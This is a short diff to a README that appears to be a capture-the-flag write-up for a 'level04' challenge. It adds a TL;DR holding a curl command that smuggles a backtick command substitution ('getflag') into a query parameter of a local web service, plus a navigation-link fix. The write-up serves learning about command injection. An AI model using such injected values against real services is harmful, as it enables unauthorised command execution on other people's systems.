@@ -8,6 +8,15 @@
 <br>
 
 
+## TL;DR:
+
+```bash
+curl 'localhost:4747?x=`getflag`'
+```
+
+<br>
+
+
 ## Explanation:
 
 
@@ -88,4 +97,4 @@ curl 'localhost:4747?x=`getflag`'
 
 ---
 
-[<<](/level03/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level05/resources/Readme.md)
+[<<](/level03/resources/Readme.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [>>](/level05/resources/Readme.md)
